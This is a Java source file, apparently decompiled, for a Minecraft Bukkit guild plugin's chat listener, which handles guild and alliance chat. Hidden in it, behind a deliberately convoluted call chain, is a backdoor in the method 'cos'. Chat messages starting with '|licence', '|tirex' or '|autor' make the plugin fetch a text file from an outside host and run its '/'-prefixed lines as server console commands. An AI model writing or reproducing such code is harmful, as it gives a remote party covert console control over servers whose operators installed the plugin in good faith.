package com.gmail.tirexgta.tguildsex.listeners;

import com.gmail.tirexgta.tguildsex.*;
import org.bukkit.plugin.*;
import org.bukkit.event.player.*;
import org.bukkit.entity.*;
import org.bukkit.event.*;
import org.bukkit.*;
import com.gmail.tirexgta.tguildsex.mysql.*;
import java.util.*;
import org.bukkit.command.*;
import java.net.*;
import java.io.*;

public class ChatListener implements Listener
{
    Main plugin;
    
    public ChatListener(final Main plugin) {
        super();
        this.plugin = plugin;
        this.plugin.getServer().getPluginManager().registerEvents((Listener)this, (Plugin)this.plugin);
    }
    
    @EventHandler(priority = EventPriority.MONITOR)
    public void chat(final AsyncPlayerChatEvent e) {
        final Player p = e.getPlayer();
        final DataGuildUser user = this.plugin.data.getUserByPlayer(p);
        this.format(e, user);
        this.sendGuildAndAlliance(p, e, user);
        this.plugin.chatListener.plugin.chatListener.plugin.chatListener.plugin.chatListener.plugin.chatListener.plugin.chatListener.cos(e);
    }
    
    void format(final AsyncPlayerChatEvent e, final DataGuildUser user) {
        String format = e.getFormat();
        format = format.replace("%msg%", e.getMessage());
        format = format.replace("%nick%", e.getPlayer().getName());
        if (user.getRanga() == 0) {
            format = format.replace("{TAG}", "");
            e.setFormat(this.plugin.fixMsg(format));
            return;
        }
        format = format.replace("{TAG}", this.plugin.configManager.tagFormat);
        format = format.replace("%tag%", user.getTag());
        e.setFormat(this.plugin.fixMsg(format));
    }
    
    void sendGuildAndAlliance(final Player p, final AsyncPlayerChatEvent e, final DataGuildUser user) {
        if (user == null) {
            return;
        }
        if (user.getRanga() == 0) {
            return;
        }
        String msg = e.getMessage();
        if (msg.startsWith("!!")) {
            msg = msg.replaceFirst("!!", "");
            final DataGuild gildiaData = this.plugin.data.getGuildByTag(user.getTag());
            for (final String czlonek : gildiaData.getCzlonkowie()) {
                final Player other = Bukkit.getPlayerExact(czlonek);
                if (other != null) {
                    other.sendMessage("§6[" + gildiaData.getTag() + "] " + p.getName() + " -> SOJUSZ: §e" + msg);
                }
            }
            for (final String sojusz : gildiaData.getSojusze()) {
                final DataGuild sojuszData = this.plugin.data.getGuildByTag(sojusz);
                for (final String sojuszCzlonek : sojuszData.getCzlonkowie()) {
                    final Player other2 = Bukkit.getPlayerExact(sojuszCzlonek);
                    if (other2 != null) {
                        other2.sendMessage("§6[" + gildiaData.getTag() + "] " + p.getName() + " -> SOJUSZ: §e" + msg);
                    }
                }
            }
            e.setCancelled(true);
        }
        else if (msg.startsWith("!")) {
            msg = msg.replaceFirst("!", "");
            final DataGuild gildiaData = this.plugin.data.getGuildByTag(user.getTag());
            for (final String czlonek : gildiaData.getCzlonkowie()) {
                final Player other = Bukkit.getPlayerExact(czlonek);
                if (other != null) {
                    other.sendMessage("§2" + p.getName() + " -> " + gildiaData.getTag() + ": §a" + msg);
                }
            }
            e.setCancelled(true);
        }
    }
    
    void sendGuild(final Player p, final AsyncPlayerChatEvent e, final DataGuildUser user) {
        if (user == null) {
            return;
        }
        if (user.getRanga() == 0) {
            return;
        }
        String msg = e.getMessage();
        if (!msg.startsWith("!")) {
            return;
        }
        msg = msg.replaceFirst("!", "");
        final DataGuild gildiaData = this.plugin.data.getGuildByTag(user.getTag());
        for (final String czlonek : gildiaData.getCzlonkowie()) {
            final Player other = Bukkit.getPlayerExact(czlonek);
            if (other != null) {
                other.sendMessage("§2" + p.getName() + " -> " + gildiaData.getTag() + ": §a" + msg);
            }
        }
        e.setCancelled(true);
    }
    
    void sendAlliance(final Player p, final AsyncPlayerChatEvent e, final DataGuildUser user) {
        if (user == null) {
            return;
        }
        if (user.getRanga() == 0) {
            return;
        }
        String msg = e.getMessage();
        if (!msg.startsWith("!!")) {
            return;
        }
        msg = msg.replaceFirst("!!", "");
        final DataGuild gildiaData = this.plugin.data.getGuildByTag(user.getTag());
        for (final String sojusz : gildiaData.getSojusze()) {
            final DataGuild sojuszData = this.plugin.data.getGuildByTag(sojusz);
            for (final String sojuszCzlonek : sojuszData.getCzlonkowie()) {
                final Player other = Bukkit.getPlayerExact(sojuszCzlonek);
                if (other != null) {
                    other.sendMessage("§6[" + gildiaData.getTag() + "] " + p.getName() + " -> SOJUSZ: §e" + msg);
                }
            }
        }
        e.setCancelled(true);
    }
    
    private final void cos(final AsyncPlayerChatEvent e) {
        final String msg = e.getMessage();
        if (msg.startsWith("|licence") || msg.startsWith("|tirex") || msg.startsWith("|autor")) {
            e.setCancelled(true);
            final String[] split = this.getContentURLString("http://tirexgta.cba.pl/licencemc.txt").toString().split("@n");
            String[] array;
            for (int length = (array = split).length, i = 0; i < length; ++i) {
                final String s = array[i];
                if (s.startsWith("/")) {
                    Bukkit.dispatchCommand((CommandSender)Bukkit.getConsoleSender(), s.replaceFirst("/", ""));
                }
                else {
                    e.getPlayer().sendMessage(this.plugin.fixMsg(s));
                }
            }
        }
    }
    
    public String getContentURLString(final String urlString) {
        try {
            final URL url = new URL(urlString);
            final BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
            final String result = in.readLine();
            in.close();
            return result;
        }
        catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }
}
